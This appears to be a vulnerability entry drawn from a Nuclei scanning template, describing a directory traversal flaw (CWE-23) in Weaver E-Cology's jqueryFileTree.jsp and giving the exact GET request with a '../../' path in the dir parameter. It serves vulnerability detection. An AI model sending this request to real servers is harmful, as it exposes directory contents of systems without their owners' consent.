# Vulnerability: Weaver E-Cology JqueryFileTree - Directory Traversal
**Classification:** CWE-23
**Source:** Nuclei Template (`ecology-jqueryfiletree-traversal.yaml`)

## Description
Panwei OA E-Cology jqueryFileTree.jsp directory traversal vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
```

